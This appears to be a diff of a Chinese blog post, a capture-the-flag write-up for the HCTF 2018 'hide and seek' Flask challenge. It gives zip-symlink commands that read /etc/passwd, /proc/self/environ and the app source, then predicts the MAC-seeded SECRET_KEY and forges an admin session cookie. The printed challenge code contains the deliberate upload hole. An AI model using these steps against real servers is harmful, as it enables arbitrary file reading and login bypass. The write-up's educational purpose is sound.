@@ -1,18 +1,202 @@
 ---
 layout: post
-title:  "2019-11-14-01"
+title:  "2019-11-16-03"
 description: 樱花落下的速度是每秒五厘米
-date:   2019-11-14
-categories: 文件上传 zip 软连接 python session伪造 重要信息文件
+date:   2019-11-16
+tags: 文件上传 zip 软连接 python session伪造 重要信息文件
 excerpt_separator: ~~~
 ---
 樱花落下的速度是每秒五厘米
+
 ~~~  
-hide and seek:
-writeup参考:https://www.anquanke.com/post/id/163974#h2-4 https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup/#hide-and-seek
-知识点:
+writeup参考:```https://www.anquanke.com/
+post/id/163974#h2-4``` ```https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup/#hide-and-seek```
+## hide and seek:
+拿到题目，读一下cookie
+```
+eyJ1c2VybmFtZSI6ImV3Z3RyIn0.DskYKw.8F8fj0a4sT0l8sD2-widlj9pN8U
+```
+解码
+
+![My helpful screenshot](/assets/img/2019-11-16-03/1.png)
+
+思路很清晰，伪造admin即可
+
+然后发现软连接可用来任意文件读取，那么想到读取secret_key
+
+开始寻找secret_key,读取些重要文件看看有没有有用的信息
+```
+ln -s /etc/passwd link
+```
+```
+zip -y test.zip link
+```
+
+![My helpful screenshot](/assets/img/2019-11-16-03/2.png)
+
+提示了docker，尝试读取/proc/self/environ中的环境变量
+```
+UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=c5a8715244dbSHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0
+```
+发现ini文件/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini，继续读取 找到了
+```
+[uwsgi] module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app 
+```
+读/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py的源码
+```python
+# -*- coding: utf-8 -*-
+from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
+import uuid
+import base64
+import random
+import flag
+from werkzeug.utils import secure_filename
+import os
+random.seed(uuid.getnode())
+app = Flask(__name__)
+app.config['SECRET_KEY'] = str(random.random()*100)
+app.config['UPLOAD_FOLDER'] = './uploads'
+app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
+ALLOWED_EXTENSIONS = set(['zip'])
+
+def allowed_file(filename):
+    return '.' in filename and \
+           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
+
+
+@app.route('/', methods=['GET'])
+def index():
+    error = request.args.get('error', '')
+    if(error == '1'):
+        session.pop('username', None)
+        return render_template('index.html', forbidden=1)
+
+    if 'username' in session:
+        return render_template('index.html', user=session['username'], flag=flag.flag)
+    else:
+        return render_template('index.html')
+
+
+@app.route('/login', methods=['POST'])
+def login():
+    username=request.form['username']
+    password=request.form['password']
+    if request.method == 'POST' and username != '' and password != '':
+        if(username == 'admin'):
+            return redirect(url_for('index',error=1))
+        session['username'] = username
+    return redirect(url_for('index'))
+
+
+@app.route('/logout', methods=['GET'])
+def logout():
+    session.pop('username', None)
+    return redirect(url_for('index'))
+
+@app.route('/upload', methods=['POST'])
+def upload_file():
+    if 'the_file' not in request.files:
+        return redirect(url_for('index'))
+    file = request.files['the_file']
+    if file.filename == '':
+        return redirect(url_for('index'))
+    if file and allowed_file(file.filename):
+        filename = secure_filename(file.filename)
+        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        if(os.path.exists(file_save_path)):
+            return 'This file already exists'
+        file.save(file_save_path)
+    else:
+        return 'This file is not a zipfile'
+
+
+    try:
+        extract_path = file_save_path + '_'
+        os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)
+        read_obj = os.popen('cat ' + extract_path + '/*')
+        file = read_obj.read()
+        read_obj.close()
+        os.system('rm -rf ' + extract_path)
+    except Exception as e:
+        file = None
+
+    os.remove(file_save_path)
+    if(file != None):
+        if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):
+            return redirect(url_for('index', error=1))
+    return Response(file)
+
+
+if __name__ == '__main__':
+    #app.run(debug=True)
+    app.run(host='127.0.0.1', debug=True, port=10008)
+```
+发现只有admin可以看到flag
+
+且无法用admin登陆，想到需要伪造session。
+
+![My helpful screenshot](/assets/img/2019-11-16-03/3.png)
+
+关键语句
+```python
+random.seed(uuid.getnode())
+app = Flask(__name__)
+app.config['SECRET_KEY'] = str(random.random()*100)
+```
+但是SECRET_KEY是随机数，需要预测，那么需要py版本号
+在
+```
+ln -s /app/main.py 1.txt
+zip -y 1.zip 1.txt
+```
+发现内容
+```python
+from flask import Flask
+app = Flask(__name__)
+
+
+@app.route("/")
+def hello():
+    return "Hello World from Flask in a uWSGI Nginx Docker container with \
+     Python 3.6 (default)"
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', debug=True, port=80)
+```
+发现python是3.6版本的，那么即可尝试预测随机数
+
+对于```uuid.getnode()```
+
+尝试读取```/sys/class/net/eth0/address```
+
+得到```12:34:3e:14:7c:62```
+
+计算十进制：20015589129314
+
+用python3.6去看一下随机数
+```python
+random.seed(20015589129314)
+print str(random.random()*100)
+```
+
+![My helpful screenshot](/assets/img/2019-11-16-03/4.png)
+
+得到secret_key=11.935137566861131
+```
+eyJ1c2VybmFtZSI6ImFkbWluIn0.Dskfqg.pA9vis7kXInrrctifopdPNUOQOk
+```
+得到flag
+
+![My helpful screenshot](/assets/img/2019-11-16-03/5.png)
+
+尝试伪造session
+## 知识点:
 1.上传zip文件时,存在任意文件读取漏洞,通过构造软连接完成(+1)
+
 2./etc/passwd里记录了一些重要配置信息
+
 3./proc/self/environ中有重要的环境变量
+
 4.发现python是3.6版本的，那么即可尝试预测随机数
+
 5.python的flask框架存在的"本地session"漏洞,可以伪造seesioin身份(在知道SECRET_KEY后)(+1)
